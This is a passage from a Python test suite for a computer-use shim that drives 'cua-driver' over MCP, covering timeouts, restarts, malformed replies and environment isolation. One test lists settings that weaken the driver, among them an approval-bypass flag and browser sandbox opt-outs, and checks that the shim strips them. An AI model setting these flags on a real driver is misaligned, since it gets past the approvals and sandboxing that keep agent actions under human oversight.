"""Computer use through cua-driver: the MCP client, the driver bridge, the
tool catalog, and the COMPUTER_TOOLS / COMPUTER_TOOL_CALL handler, against
a fake driver (tests/fake_cua_driver.py) that speaks MCP over stdio."""

from __future__ import annotations

import asyncio
import contextlib
import json
import os
import shutil
import sys
import threading
from pathlib import Path
from typing import Any

import pytest

import autogpt_local_executor.handlers as handlers_module
from autogpt_local_executor.audit import AuditWriter
from autogpt_local_executor.computer_use import catalog, concealed, driver, mcp_client
from autogpt_local_executor.computer_use.driver import CuaDriverBridge, DriverUnavailable
from autogpt_local_executor.computer_use.mcp_client import McpClosedError, StdioMcpClient
from autogpt_local_executor.config import ShimConfig
from autogpt_local_executor.handlers import ComputerUseHandler
from autogpt_local_executor.protocol import (
    ComputerImageContent,
    ComputerTextContent,
    ComputerToolCallMessage,
    ComputerToolCallPayload,
    ComputerToolResultMessage,
    ComputerToolResultPayload,
    ComputerToolsRequestMessage,
    ComputerToolsResponseMessage,
    ErrorCode,
    ErrorMessage,
    new_id,
    now_ts,
)
from tests.cua_fakes import FAKE, fake_bridge, fake_client, fake_log, records

__all__ = ["fake_log"]  # a fixture, used by name

_fake_client = fake_client
_records = records


def _bridge(*, clipboard: bool = False, **kwargs: Any) -> CuaDriverBridge:
    return fake_bridge(clipboard=clipboard, **kwargs)


# ── MCP client ───────────────────────────────────────────────────────────


async def test_the_client_completes_the_handshake_and_lists_tools(fake_log: Path) -> None:
    client = _fake_client([str(FAKE), "mcp"])
    try:
        initialized = await client.start(timeout=10)
        tools = await client.list_tools(timeout=10)
    finally:
        await client.close()

    assert (initialized.server_name, initialized.server_version) == ("cua-driver", "0.38.0")
    assert initialized.instructions == "Fake cua-driver guidance."
    assert {tool["name"] for tool in tools} >= {"click", "get_window_state"}


async def test_a_tool_list_that_repeats_its_cursor_is_refused(fake_log, monkeypatch) -> None:
    """list_tools followed nextCursor until there was none, with no check,
    so a driver that kept answering the same cursor kept it going for good,
    holding the bridge's lock and the HELLO that waits on it."""
    from autogpt_local_executor.computer_use.mcp_client import McpError

    monkeypatch.setenv("FAKE_CUA_NEXT_CURSOR", "same")
    client = _fake_client([str(FAKE), "mcp"])
    await client.start(timeout=10)
    try:
        with pytest.raises(McpError, match="cursor"):
            await asyncio.wait_for(client.list_tools(timeout=10), timeout=5)
    finally:
        await client.close()


async def test_a_driver_whose_tool_list_loops_is_unavailable(fake_log, monkeypatch) -> None:
    monkeypatch.setenv("FAKE_CUA_NEXT_CURSOR", "same")
    bridge = _bridge()
    try:
        with pytest.raises(DriverUnavailable, match="cursor"):
            await asyncio.wait_for(bridge.snapshot(), timeout=5)
    finally:
        await bridge.close()


async def test_a_tool_list_that_never_ends_is_cut_off(fake_log, monkeypatch) -> None:
    from autogpt_local_executor.computer_use import mcp_client
    from autogpt_local_executor.computer_use.mcp_client import McpError

    monkeypatch.setenv("FAKE_CUA_NEXT_CURSOR", "new")
    monkeypatch.setattr(mcp_client, "MAX_TOOL_LIST_PAGES", 5)
    client = _fake_client([str(FAKE), "mcp"])
    await client.start(timeout=10)
    try:
        with pytest.raises(McpError, match="pages"):
            await asyncio.wait_for(client.list_tools(timeout=10), timeout=5)
    finally:
        await client.close()


async def test_the_tool_list_deadline_covers_every_page(fake_log, monkeypatch) -> None:
    """Each page got the whole timeout afresh, so the timeout never bounded
    the listing."""
    import time

    from autogpt_local_executor.computer_use import mcp_client

    monkeypatch.setenv("FAKE_CUA_NEXT_CURSOR", "new")
    monkeypatch.setattr(mcp_client, "MAX_TOOL_LIST_PAGES", 10**9)
    client = _fake_client([str(FAKE), "mcp"])
    await client.start(timeout=10)
    started = time.monotonic()
    try:
        with pytest.raises(TimeoutError):
            await asyncio.wait_for(client.list_tools(timeout=0.5), timeout=30)
    finally:
        await client.close()
    # Its own 0.5 s deadline, with 10x room for a slow runner, not the guard's.
    assert time.monotonic() - started < 5


async def test_a_request_past_its_deadline_is_cancelled_as_mcp_has_it(
    fake_log: Path, monkeypatch
) -> None:
    """The client sends the cancel notice; cua-driver 0.38 reads it only
    once the request is done, and drops it. CuaDriverBridge deals with that
    (test_a_call_past_its_deadline_stops_the_driver)."""
    monkeypatch.setenv("FAKE_CUA_SLOW_SECONDS", "1")
    client = _fake_client([str(FAKE), "mcp"])
    await client.start(timeout=10)
    try:
        with pytest.raises(TimeoutError):
            await client.call_tool("drag", {"pid": -2}, timeout=0.3)
        for _ in range(250):
            if _records(fake_log, "notification_dropped")[1:]:
                break
            await asyncio.sleep(0.02)
    finally:
        await client.close()

    assert _records(fake_log, "slow_done")
    assert [r["method"] for r in _records(fake_log, "notification_dropped")] == [
        "notifications/initialized",
        "notifications/cancelled",
    ]


async def test_a_call_past_its_deadline_stops_the_driver(fake_log: Path, monkeypatch) -> None:
    """cua-driver 0.38 can't cancel a request it is running, so a call past
    its deadline went on acting on the machine after the shim had answered
    COMMAND_TIMEOUT, and the next call waited behind it."""
    monkeypatch.setenv("FAKE_CUA_SLOW_SECONDS", "2")
    bridge = fake_bridge()
    try:
        await bridge.snapshot()
        first = bridge._client
        assert first is not None
        with pytest.raises(TimeoutError):
            await bridge.call_tool("drag", {"pid": -2}, timeout=0.3)
        assert first.alive is False
        # One more start than the restart budget allows, all of them stops
        # the shim made, not the driver failing.
        for _ in range(driver.MAX_STARTS_PER_WINDOW):
            with pytest.raises(TimeoutError):
                await bridge.call_tool("drag", {"pid": -2}, timeout=0.3)
        result = await bridge.call_tool("click", {"pid": 1}, timeout=10)
        await asyncio.sleep(2.5)
    finally:
        await bridge.close()

    assert result["structuredContent"] == {"arguments": {"pid": 1}}
    assert _records(fake_log, "slow_done") == []
    assert len(_records(fake_log, "initialize")) == driver.MAX_STARTS_PER_WINDOW + 2


async def test_a_new_display_restarts_the_driver_off_the_budget(
    fake_log: Path, monkeypatch
) -> None:
    """A driver keeps the environment it started with, so after a new login
    (another display, and on GNOME another XAUTHORITY) it drove a display
    that was gone until something else restarted it. The bridge now starts
    a driver with the display the shim has, and that restart, the shim's own
    doing, doesn't count against the restart budget."""
    monkeypatch.setenv("DISPLAY", ":0")
    monkeypatch.setenv("XAUTHORITY", "/run/user/1000/xauth_0")
    bridge = fake_bridge()
    try:
        await bridge.call_tool("click", {"pid": 1}, timeout=10)
        for n in range(1, driver.MAX_STARTS_PER_WINDOW + 1):
            monkeypatch.setenv("DISPLAY", f":{n}")
            monkeypatch.setenv("XAUTHORITY", f"/run/user/1000/xauth_{n}")
            await bridge.call_tool("click", {"pid": 1}, timeout=10)
        await bridge.call_tool("click", {"pid": 2}, timeout=10)
    finally:
        await bridge.close()

    started = [record["env"] for record in _records(fake_log, "initialize")]
    assert [(env["DISPLAY"], env["XAUTHORITY"]) for env in started] == [
        (f":{n}", f"/run/user/1000/xauth_{n}") for n in range(driver.MAX_STARTS_PER_WINDOW + 1)
    ]
    assert len(_records(fake_log, "call")) == driver.MAX_STARTS_PER_WINDOW + 2


async def test_a_display_restart_cancelled_by_close_still_stops_the_old_driver(
    fake_log: Path, monkeypatch
) -> None:
    """A display-change restart stops the old driver before it starts the
    new one, and close() cancels a start under way. A cancel landing in the
    old driver's stop, in its grace period, ended the stop before the driver
    was terminated: no longer the bridge's client, it ran on after close()
    returned."""
    monkeypatch.setenv("DISPLAY", ":0")
    bridge = fake_bridge()
    await bridge.call_tool("click", {"pid": 1}, timeout=10)
    old = bridge._client
    assert old is not None
    close_old = old.close
    stopping = asyncio.Event()
    may_stop = asyncio.Event()

    async def held_close(**kwargs: Any) -> None:
        stopping.set()
        await may_stop.wait()
        await close_old(**kwargs)

    monkeypatch.setattr(old, "close", held_close)
    monkeypatch.setenv("DISPLAY", ":1")
    call = asyncio.create_task(bridge.call_tool("click", {"pid": 1}, timeout=30))
    try:
        await asyncio.wait_for(stopping.wait(), timeout=30)
        start = bridge._start
        assert isinstance(start, asyncio.Task)
        closing = asyncio.create_task(bridge.close())
        for _ in range(600):
            if start.cancelling():
                break
            await asyncio.sleep(0.05)
        assert start.cancelling()
        may_stop.set()
        await asyncio.wait_for(closing, timeout=30)

        assert old.alive is False
        with pytest.raises(DriverUnavailable):
            await call
    finally:
        may_stop.set()
        if old.alive:
            await close_old(now=True)
        if not call.done():
            call.cancel()


async def test_a_cancelled_call_stops_the_driver(fake_log: Path, monkeypatch) -> None:
    monkeypatch.setenv("FAKE_CUA_SLOW_SECONDS", "2")
    bridge = fake_bridge()
    try:
        await bridge.snapshot()
        first = bridge._client
        assert first is not None
        task = asyncio.create_task(bridge.call_tool("drag", {"pid": -2}, timeout=30))
        for _ in range(100):
            if _records(fake_log, "call"):
                break
            await asyncio.sleep(0.02)
        task.cancel()
        with pytest.raises(asyncio.CancelledError):
            await task
        assert first.alive is False
        await asyncio.sleep(2.5)
    finally:
        await bridge.close()

    assert _records(fake_log, "slow_done") == []


async def test_a_quick_call_waits_its_turn_rather_than_stopping_a_running_one(
    fake_log: Path, monkeypatch
) -> None:
    """A call that times out waiting for its turn never reached the driver,
    so it must not stop the one the driver is running: HELLO's screen size
    for one session would end another session's call."""
    monkeypatch.setenv("FAKE_CUA_SLOW_SECONDS", "1.5")
    bridge = fake_bridge()
    try:
        await bridge.snapshot()
        slow = asyncio.create_task(bridge.call_tool("drag", {"pid": -2}, timeout=30))
        for _ in range(100):
            if _records(fake_log, "call"):
                break
            await asyncio.sleep(0.02)
        with pytest.raises(TimeoutError):
            await bridge.call_tool("get_screen_size", {}, timeout=0.3)
        result = await slow
    finally:
        await bridge.close()

    assert result["content"] == [{"type": "text", "text": "slow"}]
    assert len(_records(fake_log, "initialize")) == 1


async def test_a_driver_that_exits_fails_the_waiting_request(fake_log: Path) -> None:
    client = _fake_client([str(FAKE), "mcp"])
    await client.start(timeout=10)
    try:
        with pytest.raises(McpClosedError, match="exit code 3"):
            await client.call_tool("drag", {"pid": -3}, timeout=10)
        assert not client.alive
    finally:
        await client.close()


class _StalledInput:
    """A pipe to a driver that has stopped reading its input: writes are
    taken, and a drain past the first `drains` never ends."""

    def __init__(self, drains: int = 0) -> None:
        self.written: list[bytes] = []
        self._drains = drains

    def write(self, data: bytes) -> None:
        self.written.append(data)

    async def drain(self) -> None:
        if self._drains > 0:
            self._drains -= 1
            return
        await asyncio.Event().wait()

    def is_closing(self) -> bool:
        return False


def _client_writing_to(stdin: _StalledInput) -> StdioMcpClient:
    from types import SimpleNamespace

    client = StdioMcpClient(["cua-driver", "mcp"])
    client._process = SimpleNamespace(stdin=stdin, returncode=None, pid=1)  # type: ignore[assignment]
    return client


async def test_a_request_the_driver_does_not_read_ends_at_its_deadline() -> None:
    """The deadline started once the request was written, so a driver that
    had stopped reading its input held a large call in drain() for good,
    and with it the computer's turn: the bridge stops the driver only when
    the call returns."""
    stdin = _StalledInput()
    client = _client_writing_to(stdin)
    task = asyncio.ensure_future(client.call_tool("type_text", {"text": "x" * 100}, timeout=0.2))
    try:
        done, _ = await asyncio.wait({task}, timeout=20)
        assert task in done
        with pytest.raises(TimeoutError):
            task.result()
    finally:
        task.cancel()


async def test_a_cancel_notice_the_driver_does_not_read_does_not_hold_the_call() -> None:
    """The request went out, no answer came, and the cancel notice sent at
    the deadline then waited in drain() for good."""
    stdin = _StalledInput(drains=1)
    client = _client_writing_to(stdin)
    task = asyncio.ensure_future(client.call_tool("click", {"pid": 5}, timeout=0.2))
    try:
        done, _ = await asyncio.wait({task}, timeout=20)
        assert task in done
        with pytest.raises(TimeoutError):
            task.result()
        assert b"notifications/cancelled" in stdin.written[-1]
    finally:
        task.cancel()


@pytest.mark.skipif(not sys.platform.startswith("linux"), reason="the fake fills its pipe by fcntl")
async def test_a_driver_that_stops_reading_once_it_answers_initialize_cant_hold_the_start(
    fake_log: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The start's deadline covered the initialize request, not the notice
    sent once it was answered. A driver that answered, pinged the client
    until the client's answers filled its input, and read no more held that
    notice in drain(), or held the write lock there through the client's
    answer to a ping, for good, and the bridge's start with it."""
    monkeypatch.setattr(mcp_client, "CLOSE_GRACE_SECONDS", 0.5)
    monkeypatch.setenv("FAKE_CUA_STALL_AT_INITIALIZE", "1")
    client = _fake_client([str(FAKE), "mcp"])
    start = asyncio.ensure_future(client.start(timeout=5))
    try:
        done, _ = await asyncio.wait({start}, timeout=60)
        assert start in done
        with pytest.raises(TimeoutError):
            start.result()
        assert _records(fake_log, "stalled")
        assert not client.alive
    finally:
        if not start.done():
            start.cancel()
            await asyncio.wait({start}, timeout=30)
        await client.close()


async def test_the_client_answers_the_servers_ping(fake_log: Path) -> None:
    client = _fake_client([str(FAKE), "mcp"])
    await client.start(timeout=10)
    try:
        await client.request("ping-me", {}, timeout=10)
        for _ in range(100):
            if _records(fake_log, "client_reply"):
                break
            await asyncio.sleep(0.02)
    finally:
        await client.close()

    [reply] = _records(fake_log, "client_reply")
    assert reply["message"] == {"jsonrpc": "2.0", "id": "server-1", "result": {}}


async def test_closing_the_client_closes_the_drivers_stdin(fake_log: Path) -> None:
    client = _fake_client([str(FAKE), "mcp"])
    await client.start(timeout=10)
    await client.close()

    assert _records(fake_log, "stdin_closed")


@pytest.mark.parametrize("code", ['"-32602x"', '{"code": -32602}', "[-32602]", "NaN", "Infinity"])
async def test_an_error_whose_code_isnt_an_integer_fails_only_its_own_request(
    fake_log: Path, monkeypatch, code: str
) -> None:
    """int() of a JSON-RPC error's code raised for a string, an object, a
    list, NaN or Infinity, in the task that reads the driver's answers: it
    ended, and every request then failed as if the driver had exited."""
    from autogpt_local_executor.computer_use.mcp_client import McpError

    monkeypatch.setenv("FAKE_CUA_RPC_ERROR", "get_screen_size")
    monkeypatch.setenv("FAKE_CUA_RPC_ERROR_CODE", code)
    client = _fake_client([str(FAKE), "mcp"])
    await client.start(timeout=30)
    try:
        with pytest.raises(McpError) as raised:
            await client.call_tool("get_screen_size", {}, timeout=30)
        later = await client.call_tool("click", {"x": 1, "y": 2}, timeout=30)
    finally:
        await client.close()

    assert raised.value.code == mcp_client.INTERNAL_ERROR
    assert raised.value.message.startswith("get_screen_size broke")
    # The reader went on: the driver's next answer came in.
    assert later["structuredContent"] == {"arguments": {"x": 1, "y": 2}}


async def test_a_line_nested_past_pythons_limit_is_passed_over(fake_log: Path, monkeypatch) -> None:
    """json.loads raises RecursionError, not ValueError, for a line nested
    past Python's limit: the task that reads the driver's answers ended, and
    every request then failed as if the driver had exited. It's passed over
    like any line that isn't JSON."""
    monkeypatch.setenv("FAKE_CUA_NESTED_LINE", "click")
    client = _fake_client([str(FAKE), "mcp"])
    await client.start(timeout=30)
    try:
        answer = await client.call_tool("click", {"x": 1, "y": 2}, timeout=30)
        alive = client.alive
    finally:
        await client.close()

    assert answer["structuredContent"] == {"arguments": {"x": 1, "y": 2}}
    assert alive


# ── Bridge ───────────────────────────────────────────────────────────────


async def test_the_driver_runs_under_the_shims_policy_and_without_telemetry(
    fake_log: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The policy allows exactly the offered tools; an approval bypass or a
    manifest in the shim's environment never reaches the driver."""
    monkeypatch.setenv("CUA_DRIVER_DANGEROUSLY_BYPASS_APPROVALS", "1")
    monkeypatch.setenv("CUA_DRIVER_CAPABILITY_MANIFEST_FILE", "/tmp/someone-elses.yaml")
    bridge = _bridge()
    try:
        await bridge.snapshot()
    finally:
        await bridge.close()

    [started] = _records(fake_log, "initialize")
    assert started["argv"] == ["mcp", "--direct"]
    assert started["policy"] == sorted(catalog.offered_tools(enable_clipboard=False))
    env = started["env"]
    assert env["CUA_DRIVER_PERMISSION_MODE"] == "standard"
    assert env["CUA_DRIVER_DISABLE_UNRESTRICTED"] == "1"
    assert env["DO_NOT_TRACK"] == "1"
    assert env["CUA_DRIVER_RS_TELEMETRY_ENABLED"] == "false"
    assert env["CUA_DRIVER_RS_UPDATE_CHECK"] == "false"
    assert env["CUA_DRIVER_DANGEROUSLY_BYPASS_APPROVALS"] is None
    assert env["CUA_DRIVER_CAPABILITY_MANIFEST_FILE"] is None


def test_the_driver_inherits_only_the_reviewed_cua_settings() -> None:
    """The driver took the shim's whole environment but five names, so a
    shell or service that had one of cua's own opt-outs set (from its test
    suite, say) silently weakened the driver."""
    base = {
        "PATH": "/usr/bin",
        "DISPLAY": ":0",
        "DBUS_SESSION_BUS_ADDRESS": "unix:path=/run/user/1000/bus",
        "CUA_LOG": "debug",
        "CUA_DRIVER_MANAGED_POLICY_FILE": "/etc/cua/managed.yaml",
        # Each of these weakens the driver or points it somewhere else.
        "CUA_DRIVER_BROWSER_NO_SANDBOX": "1",
        "CUA_E2E_BROWSER_NO_SANDBOX": "1",
        "CUA_DRIVER_BROWSER_NO_SECCOMP_SANDBOX": "1",
        "CUA_DRIVER_DISABLE_KEY_FOCUS_GUARD": "",
        "CUA_DRIVER_RS_MCP_HTTP_PORT": "8765",
        "CUA_DRIVER_BROWSER_PROFILE_ROOT": "/home/me/.config/google-chrome",
        "cua_driver_allow_brief_foreground": "1",
        "CUA_DRIVER_DANGEROUSLY_BYPASS_APPROVALS": "1",
        "CUA_DRIVER_PERMISSION_MODE": "unrestricted",
    }

    env = driver.driver_environment(Path("/tmp/policy.yaml"), base)

    assert {name for name in env if name.upper().startswith("CUA")} == {
        "CUA_LOG",
        "CUA_DRIVER_MANAGED_POLICY_FILE",
        "CUA_DRIVER_PERMISSION_MODE",
        "CUA_DRIVER_DISABLE_UNRESTRICTED",
        "CUA_DRIVER_RS_TELEMETRY_ENABLED",
        "CUA_DRIVER_RS_UPDATE_CHECK",
        "CUA_DRIVER_POLICY_FILE",
    }
    assert env["CUA_DRIVER_PERMISSION_MODE"] == "standard"
    assert env["PATH"] == "/usr/bin" and env["DISPLAY"] == ":0"
    assert env["DBUS_SESSION_BUS_ADDRESS"] == base["DBUS_SESSION_BUS_ADDRESS"]


def test_the_driver_inherits_none_of_the_shims_own_settings() -> None:
    """The driver took the shim's settings with the rest of its environment,
    and an app it launched by name (a terminal, say) inherited them, the
    keychain passphrase for the file fallback among them, where the agent
    could show them with `env`."""
    base = {
        "PATH": "/usr/bin",
        "DISPLAY": ":0",
        "AUTOGPT_SHIM_KEYCHAIN_PASSPHRASE": "secret",
        "AUTOGPT_SHIM_PLATFORM_URL": "https://platform.example",
        "autogpt_shim_supervisor": "systemd",
    }

    env = driver.driver_environment(Path("/tmp/policy.yaml"), base)

    assert not [name for name in env if name.upper().startswith("AUTOGPT_SHIM_")]
    assert env["PATH"] == "/usr/bin" and env["DISPLAY"] == ":0"


async def test_the_policy_file_is_private_and_removed_with_the_bridge(fake_log: Path) -> None:
    bridge = _bridge()
    await bridge.snapshot()
    [started] = _records(fake_log, "initialize")
    policy = Path(started["env"]["CUA_DRIVER_POLICY_FILE"])
    if sys.platform != "win32":
        assert policy.stat().st_mode & 0o077 == 0
    await bridge.close()

    assert not policy.exists()


@pytest.mark.parametrize("platform", ["linux", "darwin", "win32"])
async def test_a_linux_driver_runs_in_an_empty_folder_of_its_own(
    fake_log: Path, tmp_path: Path, monkeypatch, platform: str
) -> None:
    """On Linux cua-driver hands a launch_app name that matches no installed
    app to xdg-open when a file or folder of that name is in its working
    folder, which was the shim's: the person's home, under systemd. There
    it runs in an empty folder of its own now, made for each start, which
    nothing is written to, and removed with the bridge. On macOS and
    Windows, where no name is opened from it, it keeps the shim's."""
    import stat

    monkeypatch.chdir(tmp_path)
    bridge = _bridge(platform=platform)
    try:
        await bridge.snapshot()
        [started] = _records(fake_log, "initialize")
        folder = Path(started["cwd"])
        policy_folder = Path(started["env"]["CUA_DRIVER_POLICY_FILE"]).parent
        if platform == "linux":
            assert not os.path.samefile(folder, tmp_path)
            assert not os.path.samefile(folder, policy_folder)
            assert list(folder.iterdir()) == []
            assert os.path.samefile(started["env"]["PWD"], folder)
            if os.name != "nt":
                assert stat.S_IMODE(folder.stat().st_mode) == 0o500
                if os.geteuid() != 0:
                    with pytest.raises(PermissionError):
                        (folder / "notes.txt").write_text("x", encoding="utf-8")
        else:
            assert os.path.samefile(folder, tmp_path)
    finally:
        await bridge.close()

    assert folder.exists() is (platform != "linux")


async def test_only_catalog_tools_are_offered(fake_log: Path, monkeypatch) -> None:
    """A driver lists more tools than the shim relays."""
    monkeypatch.setenv("FAKE_CUA_EXTRA_TOOLS", "kill_app,set_config")
    bridge = CuaDriverBridge(
        tools=catalog.offered_tools(enable_clipboard=False) | {"kill_app"},
        binary=FAKE,
        platform="linux",
        client_factory=_fake_client,
    )
    bridge._offered = catalog.offered_tools(enable_clipboard=False)
    try:
        snapshot = await bridge.snapshot()
    finally:
        await bridge.close()

    names = {tool["name"] for tool in snapshot.tools}
    assert names == catalog.offered_tools(enable_clipboard=False)
    assert snapshot.tool("kill_app") is None


async def test_a_driver_of_another_minor_version_is_refused(fake_log, monkeypatch) -> None:
    monkeypatch.setenv("FAKE_CUA_VERSION", "0.39.0")
    bridge = _bridge()
    with pytest.raises(DriverUnavailable) as raised:
        await bridge.snapshot()
    await bridge.close()

    assert raised.value.code == ErrorCode.DEPENDENCY_MISSING
    assert raised.value.details["found_version"] == "0.39.0"


async def test_a_missing_driver_is_a_missing_dependency(tmp_path: Path) -> None:
    bridge = CuaDriverBridge(
        tools=frozenset({"click"}), binary=tmp_path / "nope", client_factory=_fake_client
    )
    with pytest.raises(DriverUnavailable) as raised:
        await bridge.snapshot()

    assert raised.value.code == ErrorCode.DEPENDENCY_MISSING


async def test_a_driver_that_fails_to_start_says_why(fake_log, monkeypatch) -> None:
    monkeypatch.setenv("FAKE_CUA_EXIT_AT_START", "1")
    bridge = _bridge()
    with pytest.raises(DriverUnavailable, match="fake driver failed to start"):
        await bridge.snapshot()
    await bridge.close()


@pytest.mark.parametrize(
    "metadata",
    [{"serverInfo": "cua-driver"}, {"capabilities": 1}, {"capabilities": ["tools"]}],
    ids=["server-info", "capabilities", "capabilities-list"],
)
async def test_a_driver_with_malformed_initialize_metadata_is_stopped(
    fake_log, monkeypatch, metadata: dict[str, Any]
) -> None:
    """A serverInfo or capabilities that wasn't an object was read after the
    start's cleanup, so it raised a plain AttributeError or TypeError: the
    driver it had started kept running, since the bridge didn't hold it
    yet, and HELLO, which goes on without computer use only for
    DriverUnavailable, failed."""
    import json

    monkeypatch.setenv("FAKE_CUA_INITIALIZE", json.dumps(metadata))
    started: list[StdioMcpClient] = []

    def factory(argv: list[str], **kwargs: Any) -> StdioMcpClient:
        client = fake_client(argv, **kwargs)
        started.append(client)
        return client

    bridge = CuaDriverBridge(
        tools=catalog.offered_tools(enable_clipboard=False),
        binary=FAKE,
        platform="linux",
        client_factory=factory,
    )
    try:
        with pytest.raises(DriverUnavailable, match="isn't an object"):
            await bridge.snapshot()
        [client] = started
        assert not client.alive
    finally:
        for client in started:
            await client.close()
        await bridge.close()


async def test_a_policy_file_that_cannot_be_written_leaves_the_driver_unavailable(
    fake_log, monkeypatch
) -> None:
    """The policy file was written before the start's error handling, so a
    full or unwritable temporary directory raised OSError out of the HELLO
    build, which drops computer use only for DriverUnavailable."""
    import errno
    import os

    def full(*_args, **_kwargs):
        raise OSError(errno.ENOSPC, os.strerror(errno.ENOSPC))

    monkeypatch.setattr(driver.tempfile, "mkdtemp", full)
    bridge = _bridge()
    try:
        with pytest.raises(DriverUnavailable, match="policy"):
            await bridge.snapshot()
    finally:
        await bridge.close()
    assert records(fake_log) == []  # the driver never started


async def test_a_start_cancelled_before_the_tool_list_stops_the_driver(fake_log) -> None:
    """Shutdown cancels the task that is starting the driver. The process it
    had started was left running, and the bridge didn't know it, so its
    close() couldn't stop it."""
    listing = asyncio.Event()
    started: list[StdioMcpClient] = []

    class StalledList(StdioMcpClient):
        async def list_tools(self, *, timeout: float) -> list[dict[str, Any]]:
            listing.set()
            await asyncio.Event().wait()
            return []

    def stalled(argv: list[str], **kwargs: Any) -> StdioMcpClient:
        client = StalledList([sys.executable, *argv], **kwargs)
        started.append(client)
        return client

    bridge = CuaDriverBridge(
        tools=catalog.offered_tools(enable_clipboard=False),
        binary=FAKE,
        platform="linux",
        client_factory=stalled,
    )
    starting = asyncio.create_task(bridge.snapshot())
    try:
        await asyncio.wait_for(listing.wait(), 30)
        starting.cancel()
        with pytest.raises(asyncio.CancelledError):
            await starting
        [client] = started
        assert not client.alive
    finally:
        for client in started:
            await client.close()
        await bridge.close()


async def test_the_driver_restarts_after_it_stops_then_gives_up(fake_log, monkeypatch) -> None:
    monkeypatch.setattr(driver, "MAX_STARTS_PER_WINDOW", 2)
    bridge = _bridge()
    try:
        with pytest.raises(DriverUnavailable, match="stopped during the call"):
            await bridge.call_tool("drag", {"pid": -3}, timeout=10)
        # The next call starts it again.
        result = await bridge.call_tool("click", {"pid": 7}, timeout=10)
        assert result["structuredContent"] == {"arguments": {"pid": 7}}
        with pytest.raises(DriverUnavailable):
            await bridge.call_tool("drag", {"pid": -3}, timeout=10)
        with pytest.raises(DriverUnavailable, match="stopped 2 times"):
            await bridge.call_tool("click", {"pid": 7}, timeout=10)
    finally:
        await bridge.close()

    assert len(_records(fake_log, "initialize")) == 2


async def test_a_restart_after_the_temp_cleaner_purged_the_policy_folder(fake_log) -> None:
    """The policy folder was made once, at the first start, so after a
    temporary-file cleaner (systemd-tmpfiles, macOS's) purged it while the
    shim ran, every later start failed to write its policy. Each start now
    makes a folder of its own: the purged one's name, once free, could be
    another user's folder."""
    bridge = _bridge()
    try:
        await bridge.snapshot()
        [first] = _records(fake_log, "initialize")
        first_folder = Path(first["env"]["CUA_DRIVER_POLICY_FILE"]).parent
        shutil.rmtree(first_folder)
        with pytest.raises(DriverUnavailable, match="stopped during the call"):
            await bridge.call_tool("drag", {"pid": -3}, timeout=10)

        result = await bridge.call_tool("click", {"pid": 7}, timeout=10)
    finally:
        await bridge.close()

    assert result["structuredContent"] == {"arguments": {"pid": 7}}
    second = _records(fake_log, "initialize")[1]
    assert Path(second["env"]["CUA_DRIVER_POLICY_FILE"]).parent != first_folder


async def test_a_driver_of_another_version_is_named_on_every_start(fake_log, monkeypatch) -> None:
    """Each start of a driver of another minor version counted against the
    restart budget, so after three the shim reported that the driver had
    stopped three times instead of the version it needs."""
    monkeypatch.setenv("FAKE_CUA_VERSION", "0.39.0")
    bridge = _bridge()
    try:
        for _ in range(driver.MAX_STARTS_PER_WINDOW + 1):
            with pytest.raises(DriverUnavailable) as raised:
                await bridge.snapshot()
            assert raised.value.code == ErrorCode.DEPENDENCY_MISSING
    finally:
        await bridge.close()


async def test_a_driver_reporting_a_version_too_long_to_pass_on_is_stopped(
    fake_log, monkeypatch
) -> None:
    """A version past ComputerDriverInfo's 64 characters that still matched
    the reviewed minor raised ValidationError after the start's cleanup: the
    driver it had started kept running, and its start stayed on the restart
    budget."""
    monkeypatch.setenv("FAKE_CUA_VERSION", "0.38." + "9" * 70)
    started: list[StdioMcpClient] = []

    def factory(argv: list[str], **kwargs: Any) -> StdioMcpClient:
        client = fake_client(argv, **kwargs)
        started.append(client)
        return client

    bridge = CuaDriverBridge(
        tools=catalog.offered_tools(enable_clipboard=False),
        binary=FAKE,
        platform="linux",
        client_factory=factory,
    )
    try:
        for _ in range(driver.MAX_STARTS_PER_WINDOW + 1):
            with pytest.raises(DriverUnavailable) as raised:
                await bridge.snapshot()
            assert raised.value.code == ErrorCode.DEPENDENCY_MISSING
        assert started and not any(client.alive for client in started)
    finally:
        for client in started:
            await client.close()
        await bridge.close()


@pytest.mark.parametrize("tools", [1, True, "click", {"name": "click"}])
async def test_a_driver_whose_tool_list_is_not_a_list_is_stopped(
    fake_log, monkeypatch, tools: object
) -> None:
    """A tools/list answer of `{"tools": 1}` raised TypeError, which the
    start's cleanup doesn't catch: the driver it had started kept running,
    held by no one, so the bridge's close() couldn't stop it. A string or an
    object was read as an empty list."""
    monkeypatch.setenv("FAKE_CUA_TOOLS_LIST", json.dumps({"tools": tools}))
    started: list[StdioMcpClient] = []

    def factory(argv: list[str], **kwargs: Any) -> StdioMcpClient:
        client = fake_client(argv, **kwargs)
        started.append(client)
        return client

    bridge = CuaDriverBridge(
        tools=catalog.offered_tools(enable_clipboard=False),
        binary=FAKE,
        platform="linux",
        client_factory=factory,
    )
    try:
        with pytest.raises(DriverUnavailable, match="isn't a list") as raised:
            await bridge.snapshot()
        assert raised.value.code == ErrorCode.INTERNAL_ERROR
        assert started and not any(client.alive for client in started)
    finally:
        for client in started:
            await client.close()
        await bridge.close()


async def test_a_driver_that_cannot_be_run_is_named_on_every_start(tmp_path: Path) -> None:
    """A driver that was found but couldn't be run (gone by then, or on a
    noexec mount) counted against the restart budget the same way."""

    def missing(argv: list[str], **kwargs: Any) -> StdioMcpClient:
        return StdioMcpClient([str(tmp_path / "gone"), *argv[1:]], **kwargs)

    bridge = CuaDriverBridge(
        tools=frozenset({"click"}), binary=FAKE, platform="linux", client_factory=missing
    )
    try:
        for _ in range(driver.MAX_STARTS_PER_WINDOW + 1):
            with pytest.raises(DriverUnavailable) as raised:
                await bridge.snapshot()
            assert raised.value.code == ErrorCode.DEPENDENCY_MISSING
    finally:
        await bridge.close()


@pytest.mark.parametrize("platform", ["darwin", "linux", "win32"])
def test_the_shim_always_owns_the_drivers_runtime(platform: str) -> None:
    """macOS's default relays to CuaDriver.app, a daemon the person installs,
    updates and shares with other clients, under its own policy; the shim
    runs its pinned driver itself instead. Linux and Windows relay to such a
    daemon too once the person has let the driver's Computer History preview
    in (a preference file cua-driver reads), so `--direct` goes everywhere."""
    assert driver.driver_runtime(platform) == "direct"
    assert driver.driver_argv(Path("cua-driver"), "direct", platform)[1:] == ["mcp", "--direct"]


def test_the_wheels_binary_is_found_without_importing_the_package(
    tmp_path: Path, monkeypatch
) -> None:
    """cua_driver/__init__ loads a native library; finding the binary must
    not."""
    package = tmp_path / "cua_driver"
    (package / "bin").mkdir(parents=True)
